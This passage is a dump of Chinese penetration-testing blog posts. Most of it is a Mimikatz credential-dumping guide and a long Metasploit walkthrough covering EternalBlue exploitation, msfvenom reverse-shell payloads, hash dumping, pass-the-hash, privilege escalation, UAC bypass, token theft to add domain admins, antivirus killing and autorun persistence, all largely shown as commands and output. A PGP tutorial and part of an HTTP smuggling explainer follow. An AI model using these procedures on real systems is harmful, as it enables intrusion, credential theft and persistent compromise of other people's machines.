exec(\"kill -9 $pid\"); usleep(1000); &#125;?&gt; 重启 apache，php 等web服务（一般不会有权限） 参考文章：不死马自己一次线下AWD线下赛总结","categories":[],"tags":[],"author":"ye1s"},{"title":"Mimikatz 浅识","slug":"Mimikatz-浅识","date":"2020-08-16T08:34:00.000Z","updated":"2020-08-16T11:02:22.516Z","comments":true,"path":"article/6533f0b0.html","link":"","permalink":"https://blog.cfyqy.com/article/6533f0b0.html","excerpt":"Mimikatz是一款能够从Windows认证(LSASS)的进程中获取内存，并且获取明文密码和NTLM哈希值的工具。","text":"Mimikatz是一款能够从Windows认证(LSASS)的进程中获取内存，并且获取明文密码和NTLM哈希值的工具。 读取密码1.以管理员身份运行命令如下： 12privilege::debugsekurlsa::logonpasswords 2.获取到 lsass.dmp 文件，然后在自己的环境下运行mimikatz这样就获取到目标密码。命令如下： 1procdump64.exe -accepteula -ma lsass.exe lsass.dmp 获取到 lsass.dmp文件后可以用 1mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" exit 来获取明文密码，最后的exit是运行完成之后停止，不然会一直运行下去","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"Mimikatz","slug":"Mimikatz","permalink":"https://blog.cfyqy.com/tags/Mimikatz/"}],"author":"ye1s"},{"title":"Metasploit 简识","slug":"Metasploit-常见命令整理","date":"2020-08-15T15:26:00.000Z","updated":"2020-10-31T02:59:07.907Z","comments":true,"path":"article/ed21da3c.html","link":"","permalink":"https://blog.cfyqy.com/article/ed21da3c.html","excerpt":"Metasploit 是一款比较好用的渗透工具。","text":"Metasploit 是一款比较好用的渗透工具。 简介基本框架MSF默认存放模块的目录如下 1/usr/share/metasploit-framework/modules/ 模块: auxiliary:负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能的辅助模块 exploits:利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动） payloads:成功exploit之后，真正在目标系统执行的代码或指令。分为3种类型的payload，分别是single、stages和stagers。shellcode是特殊的payload，用于拿shell。 single：all-in-one。完整的payload，这些payload都是一体化的，不需要依赖外部的库和包。 stagers：目标计算机内存有限时，先传输一个较小的payload用于建立连接 stages：利用stagers建立的连接下载后续payload encoders:对payload进行加密，躲避AntiVirus检查的模块 nops:提高payload稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，从而避免受到内存 地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，提高渗透攻击的可靠性。 post:后期渗透模块。在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作 evasion: 自带windows denfender的混淆，免杀效果弱 基础库： Ruby扩展(REX)：处理几乎所有的核心功能，如设置网络套接字、网络的连接、格式化和所有其他基本功能。 MSF核心：提供了基本的应用编程接口和框架的实际核心。 MSF基础：对模块提供了友好的应用编程接口 msfconsole12345678910111213use[Auxiliary/Exploit/Payload/Encoder] 选择一个指定的模块并使其开始工作show [auxiliary/exploit/payload/encoder/options] 显示可用的特定功能的模块set [options/payload] 给某个特定的对象赋值 setg [options/payload] 给某个特定的对象赋值的同时设定作用域为全局，在模块进行切换的时候，该对象的值不会改变run 在设定一个辅助模块需要的所有选项之后，启动该模块 exploit 启动一个渗透攻击模块 back 取消当前选择的模块并且退回到上一级命令窗口 info 列出模块的相关信息 search 搜索符合条件的特定模块check 检查摸个特定目标是否易受到攻击 sessions 列出当前可用会话，sessions -i id 可以进入一个session交互load/unload：调用外部的扫描命令route：添加一条路由。比如发往某个子网的流量都通过攻陷的机器发送 扫描tcp空闲扫描window上运行metasploit，线程数最好不要超过16，UXNIX平台上不要超过128 1234567msf &gt; use auxiliary/scanner/ip/ipidseq msf auxiliary(ipidseq) &gt; show optionsmsf auxiliary(ipidseq) &gt; set rhosts 192.168.2.0/24rhosts =&gt; 192.168.2.0/24msf auxiliary(ipidseq) &gt; set threads 60threads =&gt; 60msf auxiliary(ipidseq) &gt; run 服务扫描针对性扫描1）服务器消息块协议扫描 1msf &gt; use auxiliary/scanner/smb/smb_version 2）搜寻配置不当的mssql 123456msf &gt; use auxiliary/scanner/mssql/mssql_ping msf auxiliary(mssql_ping) &gt; set rhosts 192.168.2.0/24rhosts =&gt; 192.168.2.0/24msf auxiliary(mssql_ping) &gt; set threads 255threads =&gt; 255msf auxiliary(mssql_ping) &gt; run 3）ssh服务器扫描 1msf&gt;search ssh_version 4)FTP扫描 123456msf &gt; use auxiliary/scanner/ftp/ftp_version msf auxiliary(ftp_version) &gt; set threads 255threads =&gt; 255msf auxiliary(ftp_version) &gt; set rhosts 192.168.2.0/24rhosts =&gt; 192.168.2.0/24msf auxiliary(ftp_version) &gt; run 5)简单的网络管理 1search snmp_login 漏洞扫描ms17_010漏洞扫描 12345use auxiliary/scanner/smb/smb_ms17_010 # 调用漏洞扫描模块show option # 查看模块配置选项set RHOST 192.168.1.1-254 # 配置扫描目标set THREADS 30 #配置扫描线程run #运行脚本 扫描开放的vnc空口令最新版的vnc服务器不再允许使用空口令 1msf &gt; use auxiliary/scanner/vnc/vnc_none_auth 漏洞利用永恒之蓝 12345678910msf&gt; use exploit/windows/smb/ms17_010_eternalblue # 调用ms17-010永恒之蓝漏洞攻击模块msf exploit(windows/smb/ms17_010_eternalblue) &gt; show targets #查看攻击的有效对象msf exploit(windows/smb/ms17_010_eternalblue) &gt; info #查看详细信息 msf exploit(ms17_010_eternalblue) &gt; setg rhost 192.168.2.5 # 设定全局变量的攻击目标 192.168.2.5rhost =&gt; 192.168.2.5msf exploit(ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp # 调用反弹的攻击载荷payload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(ms17_010_eternalblue) &gt; set lhost 192.168.2.3 # 设定将meterpreter反弹给192.168.2.3lhost =&gt; 192.168.2.3msf exploit(ms17_010_eternalblue) &gt; show options # 查询攻击参数设置 msfdb用来管理MSF的数据库的命令 1234567msfdb init # start and initialize the databasemsfdb reinit # delete and reinitialize the databasemsfdb delete # delete database and stop using itmsfdb start # start the databasemsfdb stop # stop the databasemsfdb status # check service statusmsfdb run # start the database and run msfconsole msfvenom基本命令 123msfvenom -h msfvenom -l payloads 查看一下payloadmsfvenom -l encoders 查看编码 window: 123msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Windows -f exe &gt; shell.exe msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=3333 -f exe &gt; shell.exe linux: 1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.211.55.2 LPORT=3333 -a x86 --platform Linux -f elf &gt; shell.elf meterpreter监听端口建立会话123456789101112131 使用handler模块msf &gt; use exploit/multi/handler2 设置payloadmsf exploit(multi/handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp（当时windows时php换成windows）PAYLOAD =&gt;php/meterpreter/reverse_tcp3 设置监听主机msfexploit(multi/handler) &gt; set LHOST 192.168.88.155LHOST =&gt;192.168.88.1554 设置监听端口（默认4444）msfexploit(multi/handler) &gt; set LPORT 4444LPORT =&gt; 44445 发动攻击msfexploit(multi/handler) &gt; exploit 基本命令1234567891011121314151617background # 让meterpreter处于后台模式 sessions -i index # 与会话进行交互，index表示第一个session quit # 退出会话 shell # 获得控制台权限 irb # 开启ruby终端ps # 查看当前活跃进程 migrate pid # 将Meterpreter会话移植到进程数位pid的进程中 kill pid # 杀死进程 getpid # 获取当前进程的pid sysinfo # 查看目标机系统信息，如机器名，操作系统等 shutdown # 关机screenshot 截屏sysinfo 系统运行的平台信息getuid 查看权限getwd 获取目标机器的工作目录getlwd 得到当前系统的工作目录 run post/windows/gather/checkvm 确定是不是虚拟机 操作文件上传文件到目标主机和下载目标文件 12345678meterpreter &gt; upload /root/1.txt c:\\\\[*] uploading : /root/1.txt -&gt; c:\\[*] uploaded : /root/1.txt -&gt; c:\\\\1.txtmeterpreter &gt; download c:/2.txt /root [*] Downloading: c:/2.txt -&gt; /root/2.txt[*] Downloaded 5.00 B of 5.00 B (100.0%): c:/2.txt -&gt; /root/2.txt[*] download : c:/2.txt -&gt; /root/2.txt 搜索目标主机上的文件 123456789101112131415meterpreter &gt; search -h Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]...Search for files.OPTIONS: -d &lt;opt&gt; The directory/drive to begin searching from. Leave empty to search all drives. (Default: ) -f &lt;opt&gt; A file pattern glob to search for. (e.g. *secret*.doc?) -h Help Banner. -r &lt;opt&gt; Recursivly search sub directories. (Default: true)meterpreter &gt; search -d c:\\\\ -r flase -f *.txtFound 2 results... c:\\1.txt (2 bytes) c:\\2.txt (5 bytes) 3389开3389 123456789101112131415161718meterpreter &gt; run post/windows/manage/enable_rdp[*] Enabling Remote Desktop[*] RDP is disabled; enabling it ...[*] Setting Terminal Services service startup mode[*] The Terminal Services service is not set to auto, changing it to auto ...[*] Opening port in local firewall if necessary[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20180430181213_default_192.168.1.187_host.windows.cle_516653.txtmeterpreter &gt; netstat -anoConnection list=============== Proto Local address Remote address State User Inode PID/Program name ----- ------------- -------------- ----- ---- ----- ---------------- tcp 0.0.0.0:135 0.0.0.0:* LISTEN 0 0 696/svchost.exe tcp 0.0.0.0:445 0.0.0.0:* LISTEN 0 0 4/System tcp 0.0.0.0:3389 0.0.0.0:* LISTEN 0 0 1040/svchost.exe 远程主机的3389的端口映射到本机的1235号端口 12meterpreter &gt; portfwd add -l 1234 -r 192.168.1.187 -p 3389[*] Local TCP relay created: :1234 &lt;-&gt; 192.168.1.187:3389 密码哈希值获取密码哈希值aad3b435开头的哈希值是一个空的或者不存在的哈希值–空字符串的占位符 1234567891011121314151617meterpreter &gt; use priv[-] The 'priv' extension has already been loaded.meterpreter &gt; run post/windows/gather/hashdump[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 24a05299b237d9f48c9eff1c6a88a57e...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...No users with password hints on this system[*] Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 用得到的管理员的用户哈希值登录 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748msf &gt; use exploit/windows/smb/psexecmsf exploit(windows/smb/psexec) &gt; show optionsModule options (exploit/windows/smb/psexec): Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes The SMB service port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate asExploit target: Id Name -- ---- 0 Automaticmsf exploit(windows/smb/psexec) &gt; set rhost 192.168.1.187rhost =&gt; 192.168.1.187msf exploit(windows/smb/psexec) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(windows/smb/psexec) &gt; set lhost 192.168.1.130lhost =&gt; 192.168.1.130msf exploit(windows/smb/psexec) &gt; set lpost 4333lpost =&gt; 4333msf exploit(windows/smb/psexec) &gt; set SMBPass aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020SMBPass =&gt; aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020msf exploit(windows/smb/psexec) &gt; set SMBUser AdministratorSMBUser =&gt; Administratormsf exploit(windows/smb/psexec) &gt; exploit[*] Started reverse TCP handler on 192.168.1.230:1444 [*] 192.168.1.187:445 - Connecting to the server...[*] 192.168.1.187:445 - Authenticating to 192.168.1.187:445 as user 'Administrator'...[*] 192.168.1.187:445 - Selecting PowerShell target[*] 192.168.1.187:445 - Executing the payload...[+] 192.168.1.187:445 - Service start timed out, OK if running a command or non-service executable...[*] Sending stage (205891 bytes) to 192.168.1.187[*] Meterpreter session 1 opened (192.168.1.230:1444 -&gt; 192.168.1.187:49468) at 2018-04-30 18:48:56 -0400meterpreter &gt; 权限提升123456meterpreter &gt; use priv[-] The 'priv' extension has already been loaded.meterpreter &gt; getsystem...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM bypassuac 123456meterpreter &gt; background[*] Backgrounding session 1...msf exploit(windows/smb/psexec) &gt; use exploit/windows/local/bypassuacmsf exploit(windows/local/bypassuac) &gt; set session 1session =&gt; 1msf exploit(windows/local/bypassuac) &gt; exploit 令牌的假冒1）incognito 1234567891011121314meterpreter &gt; use incognito Loading extension incognito...Success.meterpreter &gt; list_tokens -u Delegation Tokens Available========================================NT AUTHORITY\\LOCAL SERVICENT AUTHORITY\\NETWORK SERVICENT AUTHORITY\\SYSTEMWIN-VONVJ6OMEQ7\\AdministratorImpersonation Tokens Available========================================NT AUTHORITY\\ANONYMOUS LOGON 2)ps 找到域管理员的pid参数(有时候不能看到） 12meterpreter&gt;ps meterpreter &gt; steal_token pid号 #盗取域管理员用户的令牌 利用域管理员的令牌创建用户，并授予域管理员的权限例子 123meterpreter&gt;impresonate_token SNEAKS.IN\\\\domianadminmeterpreter&gt;add_user qy qy -h 192.168.1.5 #-h是域管理员添加账号的地址meterpreter&gt;add_group_user \"Doamin Admins\" qy -h 192.168.1.5 通过跳板攻击其他主机12345678910111213141516171819meterpreter &gt; run get_local_subnets #查看本地子网[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Local subnet: 192.168.1.0/255.255.255.0meterpreter &gt; background[*] Backgrounding session 1...msf exploit(windows/local/bypassuac) &gt; route add 192.168.2.0 255.255.255.0 1 #告诉系统将远程ID通过攻击会话1来进行路由[*] Route addedmsf exploit(windows/local/bypassuac) &gt; route print #显示当前活跃的路由信息IPv4 Active Routing Table========================= Subnet Netmask Gateway ------ ------- ------- 192.168.2.0 255.255.255.0 Session 1 获取账户密码1234567891011121314meterpreter &gt; load mimikatzLoading extension mimikatz...Success.meterpreter &gt; wdigest[+] Running as SYSTEM[*] Retrieving wdigest credentialswdigest credentials===================AuthID Package Domain User Password------ ------- ------ ---- --------0;996 Negotiate WORKGROUP WIN-VONVJ6OMEQ7$ 0;46406 NTLM 0;997 Negotiate NT AUTHORITY LOCAL SERVICE 0;999 NTLM WORKGROUP WIN-VONVJ6OMEQ7$ 脚本的使用1).vnc 1234567891011meterpreter &gt; run vnc #在远程系统上安装vnc会话[*] Creating a VNC reverse tcp stager: LHOST=192.168.1.230 LPORT=4545[*] Running payload handler[*] VNC stager executable 73802 bytes long[*] Uploaded the VNC agent to C:\\Windows\\TEMP\\jzoEGmzImp.exe (must be deleted manually)[*] Executing the VNC agent with endpoint 192.168.1.230:4545...meterpreter &gt; run screen_unlock # 对目标机器上的桌面进行解锁[!] Meterpreter scripts are deprecated. Try post/windows/escalate/screen_unlock.[!] Example: run post/windows/escalate/screen_unlock OPTION=value [...][*] no working target found 2).查看系统安装的软件 1234567891011121314151617181920meterpreter &gt; run post/windows/gather/enum_applications[*] Enumerating applications installed on WIN-VONVJ6OMEQ7Installed Applications====================== Name Version ---- ------- 2345好压 v5.9 Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161 9.0.30729.6161 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161 9.0.30729.6161 Microsoft Visual C++ 2015 Redistributable (x64) - 14.0.24215 14.0.24215.1 Microsoft Visual C++ 2015 x64 Additional Runtime - 14.0.24215 14.0.24215 Microsoft Visual C++ 2015 x64 Minimum Runtime - 14.0.24215 14.0.24215 Python 2.7.13 (64-bit) 2.7.13150 VMware Tools 10.2.0.7259539[+] Results stored in: /root/.msf4/loot/20180501054603_default_192.168.1.187_host.application_930049.txt 3)迁移到稳定的进程 123456789101112meterpreter &gt; getpidCurrent pid: 1128meterpreter &gt; run post/windows/manage/migrate[*] Running module against WIN-VONVJ6OMEQ7[*] Current server process: spoolsv.exe (1128)[*] Spawning notepad.exe process to migrate to[+] Migrating to 3592[+] Successfully migrated to process 3592meterpreter &gt; getpidCurrent pid: 3592 4)关闭杀毒软件 12345meterpreter &gt; run killav[!] Meterpreter scripts are deprecated. Try post/windows/manage/killav.[!] Example: run post/windows/manage/killav OPTION=value [...][*] Killing Antivirus services on the target... 5)查看目标机上的所有来流量 1234567meterpreter &gt; run packetrecorder -i 1[!] Meterpreter scripts are deprecated. Try post/windows/manage/rpcapd_start.[!] Example: run post/windows/manage/rpcapd_start OPTION=value [...][*] Starting Packet capture on interface 1[+] Packet capture started[*] Packets being saved in to /root/.msf4/logs/scripts/packetrecorder/WIN-VONVJ6OMEQ7_20180501.0138/WIN-VONVJ6OMEQ7_20180501.0138.cap[*] Packet capture interval is 30 Seconds 6)得到目标主机系统用户的哈希值 1234567891011121314151617meterpreter &gt; run hashdump[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...][*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 24a05299b237d9f48c9eff1c6a88a57e...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...No users with password hints on this system[*] Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 7)得到详细的系统信息用户名和密码、下载全部注册表、挖掘密码哈希值和收集系统信息 123456789101112131415161718192021meterpreter &gt; run scraper[*] New session on 192.168.1.187:445...[*] Gathering basic system information...[*] Dumping password hashes...[*] Obtaining the entire registry...[*] Exporting HKCU[*] Downloading HKCU (C:\\Windows\\TEMP\\JKaHEoEs.reg)[*] Cleaning HKCU[*] Exporting HKLM[*] Downloading HKLM (C:\\Windows\\TEMP\\qCMsnidu.reg)[*] Cleaning HKLM[*] Exporting HKCC[*] Downloading HKCC (C:\\Windows\\TEMP\\PTbboPFX.reg)[*] Cleaning HKCC[*] Exporting HKCR[*] Downloading HKCR (C:\\Windows\\TEMP\\AQMWnvZo.reg)[*] Cleaning HKCR[*] Exporting HKU[*] Downloading HKU (C:\\Windows\\TEMP\\XNLnHUgE.reg)[*] Cleaning HKU[*] Completed processing on 192.168.1.187:445... 8）控制持久化-X 开机自启动，-i 40每40秒重连一次 -p指定端口 1234567891011121314151617181920212223meterpreter &gt; run persistence -X -i 40 -p 443 -r 192.168.1.187 [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Running Persistence Script[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-VONVJ6OMEQ7_20180501.2631/WIN-VONVJ6OMEQ7_20180501.2631.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.1.187 LPORT=443[*] Persistent agent script is 99671 bytes long[+] Persistent Script written to C:\\Windows\\TEMP\\ManzZNr.vbs[*] Executing script C:\\Windows\\TEMP\\ManzZNr.vbs[+] Agent executed with PID 3852[*] Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\KHNDPfTiTa[+] Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\KHNDPfTiTa开始连接msf &gt; use multi/handlermsf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 192.168.1.187lhost =&gt; 192.168.1.187msf exploit(multi/handler) &gt; set lport 443lport =&gt; 443msf exploit(multi/handler) &gt; exploit 8）列出所有后渗透模块 1234run post/ 后，按tab见meterpreter &gt; run post/Display all 207 possibilities? (y or n) 参考文章:MSF——基本使用和Exploit模块（一）","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://blog.cfyqy.com/tags/Metasploit/"}],"author":"ye1s"},{"title":"PGP加密学习","slug":"PGP加密学习","date":"2020-08-11T08:41:00.000Z","updated":"2020-08-14T13:07:28.832Z","comments":true,"path":"article/9b9a2941.html","link":"","permalink":"https://blog.cfyqy.com/article/9b9a2941.html","excerpt":"PGP (Pretty Good Privacy) 是由 Phil Zimmermann 于 1991 开发的一个用于数据加密和数字签名的程序，由于被广泛应用以至于后来形成一个开放的标准 OpenPGP，而 GnuPG 则是实现了该标准的一个开源免费程序。","text":"PGP (Pretty Good Privacy) 是由 Phil Zimmermann 于 1991 开发的一个用于数据加密和数字签名的程序，由于被广泛应用以至于后来形成一个开放的标准 OpenPGP，而 GnuPG 则是实现了该标准的一个开源免费程序。 安装 GnuPG linux 1apt-get install gnupg window 下载地址：https://www.gpg4win.org/ 常见命令生成密钥生成钥匙对 1gpg --gen-key 这时，最好再生成一张”撤销证书”，以备以后密钥作废时，可以请求外部的公钥服务器撤销你的公钥。 1gpg --gen-revoke [用户ID] 密钥管理列出密钥list-keys参数列出系统中已有的密钥． 1gpg --list-keys 显示结果如下： 123456/home/ye1s/.gnupg/pubring.kbx-----------------------------pub rsa3072 2020-08-11 [SC] [expires: 2022-08-11] 579144D23E096A7A7D21AA6784D928644A29F13Fuid [ultimate] ye1sec &lt;431774437@qq.com&gt;sub rsa3072 2020-08-11 [E] [expires: 2022-08-11] 579144D23E096A7A7D21AA6784D928644A29F13F 是这个公钥的id，ye1sec是这个公钥的uid,这个id跟uid都是用于标识这个公钥的，因为uid是用户随便输入的所以会有重复的情况，因此在某些需要明确指定公钥的命令，需要用id而不能用uid表示这个公钥。如果你要从密钥列表中删除某个密钥，可以使用delete-key参数。 1gpg --delete-key [用户ID] 输出密钥公钥文件（.gnupg/pubring.gpg）以二进制形式储存，armor参数可以将其转换为ASCII码显示。 1gpg --armor --output public-key.txt --export [用户ID] “用户ID”指定哪个用户的公钥，output参数指定输出文件名（public-key.txt）。 类似地，export-secret-keys参数可以转换私钥。 1gpg --armor --output private-key.txt --export-secret-keys [用户ID] 上传公钥公钥服务器是网络上专门储存用户公钥的服务器。send-keys参数可以将公钥上传到服务器。 1gpg --keyserver keys.gnupg.net --send-key ID 使用上面的命令，你的公钥就被传到了服务器subkeys.pgp.net，然后通过交换机制，所有的公钥服务器最终都会包含你的公钥。由于公钥服务器没有检查机制，任何人都可以用你的名义上传公钥，所以没有办法保证服务器上的公钥的可靠性。通常，你可以在网站上公布一个公钥指纹，让其他人核对下载到的公钥是否为真。fingerprint参数生成公钥指纹。 1gpg --fingerprint [用户ID] 输入密钥除了生成自己的密钥，还需要将他人的公钥或者你的其他密钥输入系统。这时可以使用import参数。 1gpg --import [密钥文件] 为了获得他人的公钥，可以让对方直接发给你，或者到公钥服务器上寻找。 1gpg --keyserver hkp://subkeys.pgp.net --search-keys [用户ID] 正如前面提到的，我们无法保证服务器上的公钥是否可靠，下载后还需要用其他机制验证． 删除密钥必须先删除私钥，然后才能删除公钥。在命令行输入如下命令： 12gpg --delete-secret-keys uidgpg --delete-keys uid 修改密钥1gpg --edit-key 加密和解密加密假定有一个文本文件demo.txt，怎样对它加密呢？ encrypt参数用于加密。 1gpg --recipient [用户ID] --output demo.en.txt --encrypt demo.txt recipient参数指定接收者的公钥，output参数指定加密后的文件名，encrypt参数指定源文件。运行上面的命令后，demo.en.txt就是已加密的文件，可以把它发给对方。 解密对方收到加密文件以后，就用自己的私钥解密。 1gpg --decrypt demo.en.txt --output demo.de.txt decrypt参数指定需要解密的文件，output参数指定解密后生成的文件。运行上面的命令，demo.de.txt就是解密后的文件。 GPG允许省略decrypt参数。 1gpg demo.en.txt 运行上面的命令以后，解密后的文件内容直接显示在标准输出。 签名对文件签名有时，我们不需要加密文件，只需要对文件签名，表示这个文件确实是我本人发出的。sign参数用来签名。 1gpg --sign demo.txt 运行上面的命令后，当前目录下生成demo.txt.gpg文件，这就是签名后的文件。这个文件默认采用二进制储存，如果想生成ASCII码的签名文件，可以使用clearsign参数。 1gpg --clearsign demo.txt 运行上面的命令后 ，当前目录下生成demo.txt.asc文件，后缀名asc表示该文件是ASCII码形式的。 如果想生成单独的签名文件，与文件内容分开存放，可以使用detach-sign参数。 1gpg --detach-sign demo.txt 运行上面的命令后，当前目录下生成一个单独的签名文件demo.txt.sig。该文件是二进制形式的，如果想采用ASCII码形式，要加上armor参数。 1gpg --armor --detach-sign demo.txt 签名+加密上一节的参数，都是只签名不加密。如果想同时签名和加密，可以使用下面的命令。 1gpg --local-user [发信者ID] --recipient [接收者ID] --armor --sign --encrypt demo.txt local-user参数指定用发信者的私钥签名，recipient参数指定用接收者的公钥加密，armor参数表示采用ASCII码形式显示，sign参数表示需要签名，encrypt参数表示指定源文件。 验证签名我们收到别人签名后的文件，需要用对方的公钥验证签名是否为真。verify参数用来验证。 1gpg --verify demo.txt.asc demo.txt 参考文章：GPG入门教程","categories":[{"name":"加密编码","slug":"加密编码","permalink":"https://blog.cfyqy.com/categories/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81/"}],"tags":[{"name":"PGP","slug":"PGP","permalink":"https://blog.cfyqy.com/tags/PGP/"},{"name":"GnuPG","slug":"GnuPG","permalink":"https://blog.cfyqy.com/tags/GnuPG/"}],"author":"ye1s"},{"title":"HTTP走私协议","slug":"HTTP走私协议","date":"2020-08-11T01:12:00.000Z","updated":"2021-01-05T02:55:52.562Z","comments":true,"path":"article/a0cdd9b6.html","link":"","permalink":"https://blog.cfyqy.com/article/a0cdd9b6.html","excerpt":"在复杂的网络环境下，不同的服务器以不同的方式实现RFC标准，利用前后端服务器对数据包的边界了解不一致的情况下，向一个请求数据包中插入下一个请求数据包的一部分，在前端服务器角度看来，它属于一个完整的请求，而在后端服务器看来，它属于两次请求，前端请求的一部分被后端服务器解释为下一个请求的开始。因此，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。","text":"在复杂的网络环境下，不同的服务器以不同的方式实现RFC标准，利用前后端服务器对数据包的边界了解不一致的情况下，向一个请求数据包中插入下一个请求数据包的一部分，在前端服务器角度看来，它属于一个完整的请求，而在后端服务器看来，它属于两次请求，前端请求的一部分被后端服务器解释为下一个请求的开始。因此，它使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。 相关概念keep-alive 与 pipeline Keep-Alive，就是在 HTTP 请求中增加一个特殊的请求头 Connection: Keep-Alive，告诉服务器，接收完这次 HTTP 请求后，不要关闭 TCP 链接，后面对相同目标服务器的 HTTP 请求，重用这一个 TCP 链接，这样只需要进行一次 TCP 握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在 HTTP1.1 中是默认开启的。 有了 Keep-Alive 之后，后续就有了 Pipeline，在这里呢，客户端可以像流水线一样发送自己的 HTTP 请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。现如今，浏览器默认是不启用 Pipeline 的，但是一般的服务器都提供了对 Pipleline 的支持。 CL 与 TECL 和 TE 即是 Content-Length 和 Transfer-Encoding 请求头（严格来讲前者是个实体头，为了方便就都用请求头代指）。这里比较有趣的是 Transfer-Encoding（HTTP/2 中不再支持），指定用于传输请求主体的编码方式，可以用的值有 chunked/compress/deflate/gzip/identity 。 chunked: Data is sent in a series of chunks. The Content-Length header is omitted in this case and at the beginning of each chunk you need to add the length of the current chunk in hexadecimal format, followed by ‘\\r\\n’ and then the chunk itself, followed by another ‘\\r\\n’. The terminating chunk is a regular chunk, with the exception that its length is zero. It is followed by the trailer, which consists of a (possibly empty) sequence of entity header fields. 设置了 Transfer-Encoding: chunked 后，请求主体按一系列块的形式发送，并将省略 Content-Length。在每个块的开头需要用十六进制数指明当前块的长度，数值后接 \\r\\n（占 2 字节），然后是块的内容，再接 \\r\\n 表示此块结束。最后用长度为 0 的块表示终止块。终止块后是一个 trailer，由 0 或多个实体头组成，可以用来存放对数据的数字签名等 1[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size &#x3D; 0][\\r\\n][\\r\\n 在计算长度时有一些需要注意的原则： 12Content-Length 需要将请求主体中的 \\r\\n 所占的 2 字节计算在内，而块长度要忽略块内容末尾表示终止的 \\r\\n请求头与请求主体之间有一个空行，是规范要求的结构，并不计入 Content-Length 走私原因在HTTP1.1后，增加了一个特殊的请求头Connection: Keep-Alive，建立tcp持续通道，进行一次tcp握手，就能传送多个请求。但这样子只能是请求一次响应一次。为了提高数据传输的效率，减少阻塞。后来就有了HTTP 